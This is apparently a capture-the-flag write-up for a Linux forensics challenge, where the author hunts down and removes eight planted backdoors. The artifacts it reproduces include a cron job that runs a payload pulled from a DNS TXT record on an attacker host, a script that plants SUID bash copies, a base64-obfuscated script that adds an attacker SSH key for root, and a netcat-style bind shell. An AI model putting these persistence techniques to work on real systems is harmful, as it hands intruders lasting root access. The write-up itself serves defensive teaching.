Challenge Description:

Hackers made it onto one of our production servers üòÖ. We‚Äôve isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn‚Äôt say what they were and we can‚Äôt get in touch with them. We need to get this server back into prod ASAP - we‚Äôre losing money every second it‚Äôs down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you‚Äôre done, run /root/solveme as root to check. You have SSH access and sudo rights to the box with the connections details attached below.
Forensic Analysis

So to get started with this challenge, I used two resources to guide me along the way. Additionally, we have a binary /root/solveme that will tell us our progress as we go along, so run it frequently to get status updates.:

Running Processes

By running ps auxf we can see all running processes on a Linux system, the user they‚Äôre running under, their PID (process id), and the command that was used to spawn the process. Here is the output:

/images/htb/challenges/forensics/persistenceisfutile/ps.png

That connectivity check process looks interesting. We can‚Äôt cat the file contents as user but we have root privileges through sudo.

/images/htb/challenges/forensics/persistenceisfutile/conn.png

This is clearly a background process to pop a reverse shell to 172.17.0.1 on port 443. So we‚Äôre going to remove this file rm -rf /var/lib/private/connectivity-check and then kill the process using the PID from ps auxf. I also am going to grep for ‚Äúconnectivity-check‚Äù to see if there are any other references on the file system. Sure enough, it‚Äôs in another location as well (so we need to remove this one as well):

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# grep -Ril "connectivity-check" /etc
/etc/update-motd.d/30-connectivity-check

When I went to get the PID, I noticed something new popped up in the running processes:

\_ sudo su -
  \_ su -
    \_ -bash
      \_ alertd -e /bin/bash -lnp 4444

That‚Äôs interesting, it looks like when I switched to the root user it spawned a new process of alertd and the syntax looks eerily similar to what we‚Äôd use to spawn a netcat listener on port 4444. I have no idea where that binary is though, but we can find it by running find / -name "alertd" and when we do we see it‚Äôs in /usr/bin/alertd. For now I‚Äôm just going to remove that file - but because it spawned when I loaded a shell as root, I have a feeling there‚Äôs something in our shell init script that‚Äôs doing that.
Alertd

To easily find where this binary is getting called from, we can grep for reference to it. If it‚Äôs spawning with shells, then it‚Äôs going to be in the shell rc file in either /root (the home directory for the root user) or /home/user.

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# grep -Ril "alertd" /root
/root/.bashrc

Knowing that we have a bad .bashrc, we can actually just overwrite it with the skeleton .bashrc stored in /etc/skel. To do that we simply run cp /etc/skel/.bashrc /root/.bashrc and we‚Äôll repeat the process for the user account since for some reason their .bashrc is actually ‚Äúowned‚Äù by root.
Cronjobs
user

We can see scheduled cron jobs by running crontab -l and sure enough we find something interesting:

user@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~$ crontab -l
* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"

I spy a DNS TXT Beacon!

dig is a command used to query DNS records and from Cloudflare‚Äôs site, we see that we can enter arbitrary text into DNS TXT records. This particular cronjob is an example of using DNS TXT records to execute a payload onto a host. The way it works is, the attacker has a malicious DNS server in the wild and when the TXT record gets queried by a resolver, it will grab whatever is in that TXT record and use it as an argument for the sh -c command. It‚Äôs safe to assume that in this scenario, the TXT record of ‚Äúimf0rce.htb‚Äù is storing a malicious payload. So, we can go ahead and remove this cron job by running crontab -e and deleting that entry. Since we found one cronjob on the user account, we should also look through the root account to see if there are any evil crons.
root

Running crontab -l as root didn‚Äôt show anything, but that doesn‚Äôt necessarily mean there aren‚Äôt malicious cron jobs. To verify this we can navigate to /etc and look through the various cron.* folders. There‚Äôs a few folders, but using some command line voodoo we can look through all them quickly by using a recursive ls on a blob like this:

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:/etc# ls -R ./cron.*
./cron.d:
anacron  e2scrub_all  popularity-contest

./cron.daily:
0anacron  access-up  apt-compat  bsdmainutils  dpkg  logrotate  man-db  popularity-contest  pyssh

./cron.hourly:

./cron.monthly:
0anacron

./cron.weekly:
0anacron  man-db

There are a few things that I don‚Äôt recognize from my familiarity with linux: access-up and pyssh. So let‚Äôs investigate those further.
access-up

#!/bin/bash
DIRS=("/bin" "/sbin")
DIR=${DIRS[$[ $RANDOM % 2 ]]}

while : ; do
    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
done

cp /bin/bash ${DIR}/${NEW_UUID}
touch ${DIR}/${NEW_UUID} -r /bin/bash
chmod 4755 ${DIR}/${NEW_UUID}

This is a really cool (and by ‚Äúcool‚Äù, I of course mean DANGEROUS) bash script. Here‚Äôs what it‚Äôs doing line by line. First we define ‚ÄúDIRS‚Äù as either /bin or /sbin. Then we‚Äôre going to define another variable DIR that is going to divide a random number by 2, and if it has a remainder (i.e. it‚Äôs odd) we‚Äôll use /sbin and if has no remainder we use /bin (2 % 2 = 0, 3 % 2 = 1). After that, it generates a random number via /dev/urandom and then converts the random number to alphabetic characters (a-z). So let‚Äôs say it generates the number ‚Äú21312566‚Äù, then it will convert it to something like ‚Äúfolofwtt‚Äù then use fold -w 6 to take the first 6 characters, leaving us with ‚Äúfolofw‚Äù as our potential file name.

Once it‚Äôs generated a file name, it runs cp /bin/bash ${DIR}/${NEW_UUID} to essentially copy the bash shell into whatever DIR it landed on (/bin or /sbin) and then naming it according to the random name that was generated. So in my example, /bin/folofwtt actually is the same binary as /bin/bash. SPOOKY. The very last line is the most important part of this little script though. chmod 4755 is a huge red flag because the 4 means we‚Äôre giving this binary SetUID permission‚Ä¶ aka root permission!. So if I, Joe Hacker, was to execute the random binary we generated (/bin/folofwtt) it would actually spawn an instance of /bin/bash owned by the user root. Yeah‚Ä¶ big yikes here, so we DEFINITELY want to delete this script.
pyssh

#!/bin/sh

VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

if [ $MAJOR -le 6 ]; then
    /lib/python3/dist-packages/ssh_import_id_update
fi

This script looks to be using a python module called ssh_import_id_update to do something. Investigating this file further:

#!/bin/bash
KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

/bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"

This script is adding whatever KEY is to PATH. They‚Äôre base64 encoded so let‚Äôs just run the commands and see what‚Äôs inside: /images/htb/challenges/forensics/persistenceisfutile/key.png /images/htb/challenges/forensics/persistenceisfutile/path.png

So this script is being used to add a public SSH key to the root user‚Äôs authorized_keys file. Meaning they‚Äôll be able to SSH in as root whenever they want. So we‚Äôre gonna go ahead and remove this script and the cronjob that calls it. And with that, we‚Äôve cleared all the potentially nasty cron jobs. Last thing in this step is to remove that SSH key from our authorized_keys file.
Binaries with SetUID permissions

Our next step is going to be to take a look at any binaries that are owned by root and also have SetUID permissions. To do this, we can use the command find / -user root -perm -4000 -print. Remember earlier, we found a script that generates binaries as root with 6-character names:

/images/htb/challenges/forensics/persistenceisfutile/setuid.png

We‚Äôll go ahead and remove the suspicious binaries, and move on for now.
Checking users with Root Privilege

Next thing we want to do is go to /etc/passwd and /etc/shadow to see if there are any suspicious user accounts with elevated privilege and shell access.

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# cat /etc/passwd | grep -i "/bash"
root:x:0:0:root:/root:/bin/bash
gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/bash
user:x:1000:1000::/home/user:/bin/bash

Gnats are annoying

I‚Äôm interested in that gnats user:

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# groups gnats
gnats : root

I‚Äôm pretty sure a ‚Äúbug reporting‚Äù service doesn‚Äôt need root privilege or shell access, so let‚Äôs change that. We can change it‚Äôs shell to disable logins by running usermod -s /usr/sbin/nologin gnats. After that, we can change it‚Äôs group so it‚Äôs not a part of root by running usermod -g <groupid>. Doing these two things (removing login capability, and removing root gid) should be sufficient to lock down that account for now.
Flag

Between each step we can run /root/solveme to check our progress, and at this point it looks like we‚Äôre done.

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is fully remediated
Issue 7 is fully remediated
Issue 8 is fully remediated

Congrats: HTB{.........}
